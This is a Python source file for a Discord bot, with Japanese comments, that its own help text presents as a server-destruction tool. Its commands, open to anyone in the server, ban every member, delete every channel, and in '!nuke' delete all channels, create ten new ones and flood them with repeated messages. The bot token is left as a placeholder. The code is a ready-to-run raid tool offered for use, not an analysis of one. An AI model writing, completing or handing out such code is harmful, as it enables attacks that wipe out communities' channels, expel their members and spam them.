import discord
import asyncio
import random
import string

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"ohno logged({client.user})")
client.change_presence(activity=discord.Game(name="!help"))

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.strip() == '!help':
        await message.channel.send('```!allban 全員ban\n!allchannels 全チャンネル削除\n!nuke 全チャンネル削除とspam```')

    if message.content.strip() == '!allban':
        async def ban(ctx):
            for member in ctx.guild.members:
                try:
                    await member.ban()
                except:
                    pass
        await ban(message) 

    if message.content.strip() == '!allchannels':
        async def delchannels(ctx):
            for c in ctx.guild.channels:
                try:
                    await c.delete()
                except:
                    pass
        await delchannels(message) 

    if message.content.strip() == '!nuke':
        for c in message.guild.channels:
            try:
                await c.delete()
            except:
                pass
                
        await asyncio.sleep(1)# チャンネルを消す遅延
        
        channel_names = [f"nukeで作成するチャンネル名{random.choice(string.ascii_letters)}" for _ in range(10)]# 作るチャンネルの数
        post_message = "投稿したい文"

        created_channels = []
        for name in channel_names:
            try:
                channel = await message.guild.create_text_channel(name)
                created_channels.append(channel)
            except Exception as e:
                pass

        await asyncio.sleep(1)# チャンネルを作る遅延(これくらいでいいかも)

        async def send_messages():

            for i in range(5):  # 送る数
                tasks = []
                for channel in created_channels:
                    tasks.append(channel.send(post_message))
                await asyncio.gather(*tasks)
                await asyncio.sleep(1) # メッセージを送る遅延
        
        await send_messages()
token='botのトークン'       
client.run(token)
